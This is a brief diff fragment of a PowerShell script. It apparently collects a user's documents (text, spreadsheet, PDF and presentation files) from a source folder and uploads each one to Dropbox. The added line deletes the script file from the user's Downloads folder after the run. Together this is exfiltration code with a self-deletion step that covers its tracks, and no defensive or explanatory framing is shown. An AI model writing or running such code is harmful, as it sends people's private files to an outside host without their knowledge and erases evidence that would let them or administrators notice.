@@ -27,3 +27,4 @@ foreach($files in Get-ChildItem -path $src -Include *.txt,*.xlsx,*.pdf,*.ppt,*.d
     $files | DropBox-Upload
     
 }
+Remove-Item -path C:\Users\$env:username\downloads\test.ps1
